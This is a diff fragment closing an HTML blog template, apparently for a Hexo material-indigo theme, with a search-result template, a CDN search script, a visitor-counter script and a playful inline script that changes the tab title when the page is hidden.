+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
